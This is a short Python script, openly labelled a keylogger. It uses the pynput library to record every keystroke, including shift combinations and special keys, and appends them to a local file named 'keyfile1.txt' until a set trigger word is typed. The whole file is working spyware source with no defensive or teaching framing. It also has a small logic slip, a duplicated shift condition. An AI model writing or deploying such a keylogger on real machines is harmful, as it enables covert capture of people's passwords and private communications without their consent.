from pynput import keyboard

stop_sequence = "daddy"
current_sequence = ""

shift_pressed = False

def on_press(key):
    global current_sequence, shift_pressed
    
    try:
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = True
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = False
        
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            if shift_pressed:
                char = f"[SHIFT+{char.upper()}]"
            else:
                char = char.lower()
            
            current_sequence += char
            if current_sequence[-len(stop_sequence):] == stop_sequence:
                print(f"'{stop_sequence}' detected. Stopping keylogger.")
                return False  
            
            with open("keyfile1.txt", 'a') as logKey:
                logKey.write(char)
                logKey.flush()  
        
        
        elif key == keyboard.Key.space:
            current_sequence += ' '
            with open("keyfile1.txt", 'a') as logKey:
                logKey.write(' ')
                logKey.flush()  
        
        else:
            special_key = str(key).replace("Key.", "")
            if special_key:  
                with open("keyfile1.txt", 'a') as logKey:
                    logKey.write(f"[{special_key}]")
                    logKey.flush()  

    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    global shift_pressed
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = False

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()  
